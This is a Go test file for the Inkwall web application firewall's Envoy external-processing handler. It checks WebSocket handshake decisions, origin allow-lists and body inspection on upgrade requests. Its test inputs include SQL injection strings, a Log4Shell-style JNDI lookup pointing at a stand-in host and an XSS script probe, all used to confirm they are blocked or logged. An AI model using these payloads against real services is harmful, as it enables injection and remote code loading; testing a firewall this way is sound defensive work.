// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package extproc

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
	"time"

	filterv3 "github.com/envoyproxy/go-control-plane/envoy/extensions/filters/http/ext_proc/v3"
	extprocv3 "github.com/envoyproxy/go-control-plane/envoy/service/ext_proc/v3"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// wsHeaders is the request_headers message Envoy sends for a WebSocket
// handshake: without end_of_stream, as the upgraded connection's data
// follows, and with the client's Upgrade and Connection headers. Body
// mode BUFFERED_PARTIAL is how Envoy Gateway configures a policy in block
// mode.
func wsHeaders(path string, kv ...string) *extprocv3.ProcessingRequest {
	kv = append([]string{
		"upgrade", "websocket", "connection", "Upgrade", "origin", "https://app.example.com",
		"sec-websocket-key", "dGhlIHNhbXBsZSBub25jZQ==", "sec-websocket-version", "13",
	}, kv...)
	return withMode(headers("GET", path, false, kv...), filterv3.ProcessingMode_BUFFERED_PARTIAL)
}

// wsFrame is a masked text frame a client sends once upgraded.
var wsFrame = string([]byte{0x81, 0x85, 0x37, 0xfa, 0x21, 0x3d, 0x7f, 0x9f, 0x4d, 0x51, 0x58})

func wsPipeline(t *testing.T, mode pipeline.Mode, origins ...string) *pipeline.Pipeline {
	t.Helper()
	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	ws, err := pipeline.CompileWebSocket(pipeline.WebSocketConfig{AllowedOrigins: origins})
	if err != nil {
		t.Fatal(err)
	}
	return pipeline.New(eval, pipeline.Config{Mode: mode, Timeout: 10 * time.Second, WebSocket: ws})
}

// TestWebSocketHandshake: a handshake is decided on its headers. Before
// #276 the engine waited for a body, which never comes before the upgrade
// is answered, and Envoy held the handshake until its idle timeout.
func TestWebSocketHandshake(t *testing.T) {
	tests := []struct {
		name    string
		origins []string
		headers *extprocv3.ProcessingRequest
		want    int // status of the denial; 0 upgrades
	}{
		{"clean", nil, wsHeaders("/chat"), 0},
		{"allowed origin", []string{"https://app.example.com"}, wsHeaders("/chat"), 0},
		{"forbidden origin", []string{"https://other.example.com"}, wsHeaders("/chat"), 403},
		{"attack in the query", nil, wsHeaders("/chat?room=1%27%20OR%20%271%27%3D%271"), 403},
		{"attack in a header", []string{"https://app.example.com"}, wsHeaders("/chat", "sec-websocket-protocol", "${jndi:ldap://evil.example/a}"), 403},
		{"explicit empty body", nil, wsHeaders("/chat", "content-length", "0"), 0},
	}
	for _, mode := range []pipeline.Mode{pipeline.ModeBlock, pipeline.ModeDetect} {
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				var logs bytes.Buffer
				e := newEnvoy(t, wsPipeline(t, mode, tt.origins...), 64, &logs)
				resps := e.exchange(t, tt.headers)
				want := tt.want
				if mode == pipeline.ModeDetect {
					want = 0
				}
				if got := denied(t, resps[0]); got != want {
					t.Fatalf("mode %d: status %d, want %d (%v); events: %s", mode, got, want, resps[0], logs.String())
				}
				if want == 0 {
					// Continue now, and send nothing more of this request.
					common := resps[0].GetRequestHeaders().GetResponse()
					if common.GetStatus() != extprocv3.CommonResponse_CONTINUE_AND_REPLACE || common.GetBodyMutation() != nil {
						t.Fatalf("answer %v, want CONTINUE_AND_REPLACE without a body mutation", resps[0])
					}
				}
				if logged := logs.Len() != 0; logged != (tt.want != 0) {
					t.Fatalf("mode %d: events %q, want one only for a denial", mode, logs.String())
				}
			})
		}
	}
}

// TestUpgradeWithBody: an upgrade request that declares a body is
// inspected with it, as any request: the upgrade isn't a way around body
// inspection.
func TestUpgradeWithBody(t *testing.T) {
	form := []string{"content-type", "application/x-www-form-urlencoded"}
	for _, tt := range []struct {
		name string
		kv   []string
	}{
		{"content-length", append(form, "content-length", "24")},
		{"chunked", append(form, "transfer-encoding", "chunked")},
		{"two content-lengths", append(form, "content-length", "0", "content-length", "24")},
	} {
		t.Run(tt.name, func(t *testing.T) {
			e := newEnvoy(t, newPipeline(t, pipeline.ModeBlock), 64, &bytes.Buffer{})
			resps := e.exchange(t, wsHeaders("/chat", tt.kv...), body("user=admin'%20OR%201=1--", true))
			if len(resps) != 2 {
				t.Fatalf("answers %v: the verdict must wait for the body", resps)
			}
			continued(t, resps[0])
			if got := denied(t, resps[1]); got != 403 {
				t.Fatalf("status %d, want 403 (%v)", got, resps[1])
			}
		})
	}
	// Not a GET: not a handshake.
	e := newEnvoy(t, newPipeline(t, pipeline.ModeBlock), 64, &bytes.Buffer{})
	m := withMode(headers("POST", "/chat", false, append(form, "upgrade", "websocket", "connection", "Upgrade")...), filterv3.ProcessingMode_BUFFERED_PARTIAL)
	if resps := e.exchange(t, m, body("user=admin'%20OR%201=1--", true)); len(resps) != 2 || denied(t, resps[1]) != 403 {
		t.Fatalf("POST upgrade: answers %v, want the body inspected and denied", resps)
	}
}

// TestWebSocketObservabilityMode: in detect mode Envoy streams the
// request: the handshake is decided on its headers, and the engine closes
// the stream at once. Before #276 it took the WebSocket's frames for a
// body, and logged every handshake as oversized when the connection
// closed.
func TestWebSocketObservabilityMode(t *testing.T) {
	tests := []struct {
		name    string
		origins []string
		path    string
		want    string // the event's reason; "" for none
	}{
		{"clean", nil, "/chat", ""},
		{"allowed origin", []string{"https://app.example.com"}, "/chat", ""},
		{"forbidden origin", []string{"https://other.example.com"}, "/chat", "websocket"},
		{"attack in the query", nil, "/chat?room=<script>alert(1)</script>", "rule"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var logs bytes.Buffer
			e := newEnvoy(t, wsPipeline(t, pipeline.ModeBlock, tt.origins...), 64, &logs)
			h := withMode(wsHeaders(tt.path), filterv3.ProcessingMode_STREAMED)
			e.observe(t, h, body(wsFrame, false), body(wsFrame, false))
			got := ""
			if strings.Contains(logs.String(), `"security event"`) {
				var ev struct{ Reason string }
				if err := json.Unmarshal(logs.Bytes(), &ev); err != nil {
					t.Fatal(err)
				}
				got = ev.Reason
			}
			if got != tt.want {
				t.Errorf("event reason %q, want %q: %s", got, tt.want, logs.String())
			}
		})
	}
}
